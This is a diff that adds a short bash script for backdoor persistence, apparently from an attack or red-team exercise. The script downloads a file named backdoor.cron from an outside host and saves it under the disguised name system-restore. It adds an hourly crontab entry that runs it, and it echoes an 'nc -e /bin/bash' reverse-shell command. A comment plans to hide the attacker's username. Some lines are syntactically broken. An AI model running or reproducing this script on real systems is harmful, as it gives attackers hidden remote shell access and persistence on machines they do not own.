@@ -1,0 +1,14 @@
+#!/bin/bash
+
+wget -O /usr/local/sbin/system-restore $IP:6121/backdoor.cron
+chmod +700 /usr/local/sbin/system-restore
+
+#todo - make this get system time, and pull name currently in it, and store it, and put my username in 1 second before timer hits the minute mark, then restore file
+
+CT=$(crontab -l)
+CT=$CT$'\n1  * * * * system-restore || run-parts --report /etc/cron.hourly
+printf "$CT" | crontab -
+
+echo 'nc -e /bin/bash $IP $PORT 2>dev/null
+
+
